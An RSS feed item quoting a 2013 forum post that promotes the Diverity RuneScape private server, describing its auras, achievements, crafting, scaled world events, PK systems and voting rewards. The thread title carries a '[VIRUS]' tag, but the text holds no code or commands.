<p>You can purchase (with IP) or craft temporary auras and boosters. You can only have ONE aura active at a time, but you can have as many boosters as you’d like. Auras provide valuable bonus effects that can optimize your gameplay.<br>
Example auras:<br>
<img src="http://i.imgur.com/cbH25.png" alt width="" height=""><br>
<img src="http://i.imgur.com/T3dpC.png" alt width="" height=""><br>
Boosters do what they sound like - they boost stuff. Examples:<br>
IP Booster: Increases IP gain by 50%<br>
XP Booster: Increases XP gain by 25%/50% (depending on tier)<br>
EP Booster: Doubles EP gain in the Wilderness and increases the value of EP drops<br>
Drop Rate Booster: Increases the chance to obtain rare items by 30%</p>
<p>[B][I][SIZE=4]Achievement System[/SIZE][/I][/B]<br>
Diverity offers over 80 achievements to unlock. Unlocking an achievement grants a certain amount of achievement points, and one achievement coin for every 10 achievement points you earn. Achievement coins can be spent in a store. Certain achievements also grant you special titles to use on the ::yell channel!</p>
<p><img src="http://i.imgur.com/GCCTWbR.png" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/GOTy9.gif" alt width="" height=""></p>
<p>[B][I][SIZE=3]Daily Achievements[/SIZE][/I][/B]<br>
Daily achievements consist of many categories and each category can be completed once per day. Every category completed grants coins, achievement points, and during certain events, bonus items. When any 5 categories are completed, a [B]daily achievement chest[/B] is rewarded, which contains IP, unique crafting materials, as well as a chance at auras and other rare items like the recipe item for the glacial whip and certain premium items.<br>
<img src="http://i.imgur.com/jWZUucp.png" alt width="" height=""></p>
<p>[B][I][SIZE=4]Item Crafting + Customs[/SIZE][/I][/B]<br>
There are a lot of custom items in Diverity that fit well in the context of RSPS. Most of these items are crafted out of more familiar items - for example, to craft a gilded whip, you’ll need an abyssal whip, dragonstones, and mystic shards (from daily achievements). To craft an item, you need the recipe item and the required materials. Some recipes are permanent (like aura recipes), and some are one-use (equipment recipes). Recipes come from various sources - some come from the Vote Point store, some come from the IP store, some come from monster drops, etc. Can you hunt down the recipe and materials to make your dream weapon?</p>
<p><img src="http://www.ultraimg.com/images/icmCp.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/KHdAh.gif" alt width="" height=""><br>
Here are a couple examples of the customs you can craft:<br>
<img src="http://www.ultraimg.com/images/uMYWi.gif" alt width="" height=""> TALKING ROCK CRAB OP LOLZ<br>
<img src="http://www.ultraimg.com/images/3XPfN.gif" alt width="" height=""></p>
<p>[B][I][SIZE=4]Server World Events + Difficulty Scaling[/SIZE][/I][/B]<br>
The server occasionally spawns a number of different kinds of events. These events scale difficulty and volume with the amount of players that attend the event (or, in certain cases, total players online), and after the event concludes, ALL participants receive rewards depending on their contribution level (bronze, silver, gold, or platinum). The scaling is designed in such a way that all participants can get a gold-level contribution.</p>
<p>A couple different events are detailed below:</p>
<ol>
<li>Shooting star<br>
A shooting star falls from the sky in a general location (e.g. East Ardy, Seer’s Village, etc), and players have to hunt down the star. The first person to find the star will receive 25% bonus rewards at the end of the event. Mining the star grants stardust and mining experience based on the size of the star. Stardust can be sold to the general store or exchanged for rewards. Players also receive a 25% XP boost for 30 minutes after the event concludes, as well as IP.<br>
<img src="http://i.imgur.com/oM1QZ.png" alt width="" height="">
</li>
<li>Bandos Invasion<br>
Bandos has always been the most popular in the Godwars Dungeon. However, consistently killing his generals doesn’t make him very happy. After his anger reaches a certain threshold, hell breaks loose and he sends forces to invade Falador. Players have 30 minutes to clear out the generals and minions inhabiting the city, or Bandos will capture white knights to fight for his will. After clearing all the normal Bandos monsters, an elite version of General Graardor spawns in the castle and scales in strength to the amount of players fighting him. After defeating him, players can loot a Bandos event chest which has a very high rate to give Bandos items, as well as a small chance at a legendary recipe for an infinite GWD key, which gives you and your allies full GWD killcount infinitely.<br>
<img src="http://www.ultraimg.com/images/uyxW2.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/VPkqz.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/fzIFd.gif" alt width="" height="">
</li>
</ol>
<p>[B][I][SIZE=3]Bosses with Difficulty Scaling[/SIZE][/I][/B]<br>
Sometimes, it is annoying to compete for bosses. However, certain bosses are made under the event framework to scale in difficulty with the amount of players fighting it, such that it is justified for the boss’s loot to be distributed to every person via a chest. Long story short - bosses with difficulty scaling can be fought solo or in a group, and everybody always get the same, if not more, loot than normal!</p>
<p>[B][I][SIZE=4]Dungeoneering[/SIZE][/I][/B]<br>
What’s a server without a dungeon system? Diverity has its own dungeoneering system that was made (in a couple days) to be better than that of SoulSplit. The experience scales up as your Dungeoneering level gets higher, and you unlock new floors. There are currently 4 floors, each with a pre-designated party size.</p>
<p><img src="http://i.imgur.com/Lc2OT.png" alt width="" height=""><br>
<img src="http://i.imgur.com/JCOkv.png" alt width="" height=""><br>
<img src="http://i.imgur.com/mdlbT.png" alt width="" height=""><br>
(floor 3 is a trio dungeon with a focus on a complicated puzzle; sadly, I don’t have a screenshot)<br>
<img src="http://i.imgur.com/zfoqF.png" alt width="" height=""></p>
<p>[B][I][SIZE=4]PKing[/SIZE][/I][/B]<br>
PKing is one of my favorite aspects of RSPS, especially when it isn’t just arranged fighting. There are high-value resources in the Wilderness, such as Frost/Mithril dragons (they drop Frostbite/Hailstorm dagger) and bosses with incredible drops (Bork drops corrupt Vesta and hand cannon), and if you want to obtain these drops, you might just become prey for the PKers out there.</p>
<p><img src="http://www.ultraimg.com/images/UdTag.gif" alt width="" height=""></p>
<p>[B][I][SIZE=3]PK Systems[/SIZE][/I][/B]<br>
<img src="http://i.imgur.com/7Yd0A.png" alt width="" height=""><br>
There are many systems that come with PKing.</p>
<ol>
<li>Influence Point gain<br>
You gain a variable amount of IP per kill, depending on many factors, including you and your opponent’s killstreak.</li>
<li>Multi-kills<br>
Killing multiple people back-to-back sends global multi-kill messages to the server and grants you bonus IP (while making you look like a total BA).</li>
<li>PK rating<br>
After killing 50 players, you are given a PK rating starting at 1200. This rating increases or decreases when you die/kill in the Wilderness, depending on your opponent’s rating. Reaching certain rating unlocks achievements and titles.</li>
<li>EP<br>
Killing players, monsters, and bosses in the Wilderness all grant EP. When killing a player, EP is cashed in for bonus drops. You can even receive legendary recipes for items such as the primal longsword if you have the maximum EP.</li>
</ol>
<p>[B][I][SIZE=3]Everything works as it should[/SIZE][/I][/B]<br>
You’ve already seen the content we are capable of. Except all items you are familiar with, all the way from dragon claws to BGS to SWH to Morrigan’s javelin and thrownaxes and even the Staff of Light, to work as they did pre-EoC RS.</p>
<p><img src="http://www.ultraimg.com/images/BMxoH.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/mlEed.gif" alt width="" height=""></p>
<p>[B][I][SIZE=3]F2P PKing Zone[/SIZE][/I][/B]<br>
Whether you’re familiar with F2P PKing or not, there is an F2P PK zone open that only allows F2P items, prayers, and magics. This means no claws, no curses, no super potions, no ancients, not even monkfish!<br>
The only abnormality is mystic robes and wave spells - F2P mages were severely underpowered, so they are allowed to use mystic and wave spells to compensate.<br>
Corrupt dragon weapons/armor (chaos elemental drop) as well as gravite weapons (F2P PKP store) are allowed in this zone.</p>
<p><img src="http://www.ultraimg.com/images/jdCrQ.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/SJg9A.gif" alt width="" height=""></p>
<p>[B][I][SIZE=4]Voting[/SIZE][/I][/B]<br>
Voting is core to any RSPS. Vote for Diverity for voting points; as you vote consecutively, you will gain more and more voting points; eventually, you can even gain double voting points!<br>
You can even purchase Donator status with voting points!<br>
<img src="http://www.ultraimg.com/images/Ht6mi.gif" alt width="" height=""><br>
<img src="http://www.ultraimg.com/images/mHfwi.gif" alt width="" height=""></p>
<p>[B][I][SIZE=4]Runes and Rune Points[/SIZE][/I][/B]<br>
Is your bank bursting with excess Bandos and Torva? Never fear, the rune point exchange is here! You can perform this ONE-WAY trade of your valuable items to rune points, which you can spend on powerful runes. These runes, once applied to a rune page, permanently buff your character and give you bonuses such as magic damage %, lifesteal %, defense, attack, and even strength and prayer.<br>
<img src="http://www.ultraimg.com/images/VvAkt.gif" alt width="" height=""><br>
<img src="http://i.imgur.com/bEDV4.png" alt width="" height=""></p>
<p>[B][I][SIZE=4]Thank you for reading about my server![/SIZE][/I][/B]<br>
I sincerely thank you for taking time to invest your valuable time to look into my server. I hope you consider joining Diverity to become a part of the next RSPS generation.<br>
Now, if you’ve actually read through this whole post, you know it was all pretty serious stuff. But let’s loosen the mood a bit - here are some fail clips and random bonus features from my server that might entertain you.</p>
<p>TYPING JAIL<br>
<img src="http://www.ultraimg.com/images/eGiW.gif" alt width="" height=""><br>
Lots of 317 servers have monkeys to kill for jail. But for Diverity, it’s different. You have to type randomly generated sentences! When I created this, lots of people were asking to be jailed, and we would have a typing competition. Good times!</p>
<p>THE NOCLIP POLICE<br>
<img src="http://www.ultraimg.com/images/lG0wb.gif" alt width="" height=""><br>
They’re always watchin’.</p>
<p>BEST HYBRID AFRICA<br>
<img src="http://www.ultraimg.com/images/02LNb.gif" alt width="" height=""><br>
After I did this I was laughing like mad for a good 5 minutes.</p>
<p>Again, if you plan to join this server, don’t forget the referral bonus for typing in ::ref-mopar<br>
~</p>
<p>[/FONT]</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395/1</link>
        <pubDate>Sun, 22 Dec 2013 01:50:49 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-537395-1</guid>
        <source url="https://forum.moparisthebest.com/t/virus-317-diverity-legendary-server-with-countless-updates-never-before/537395.rss">[VIRUS] [317]Diverity: Legendary server with countless updates never before</source>
      </item>
  </channel>
</rss>
